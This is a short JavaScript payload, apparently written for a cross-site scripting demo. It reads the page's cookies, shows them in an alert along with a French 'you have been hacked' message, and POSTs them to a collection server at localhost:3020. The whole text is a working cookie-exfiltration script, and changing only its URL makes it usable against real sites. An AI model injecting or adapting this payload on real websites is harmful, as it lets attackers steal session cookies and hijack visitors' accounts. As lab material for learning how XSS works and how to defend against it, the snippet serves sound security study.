let cookie = document.cookie;
cookie = JSON.stringify(cookie);
alert(cookie);
alert('tu as ete piraté');
const url = 'http://localhost:3020/';
fetch(url, {
	method: 'POST',
	body: JSON.stringify(cookie),
	dataType: 'json',
	contentType: 'application/json',
}).then((res) => {
	console.log('Request complete! response:', res);
});
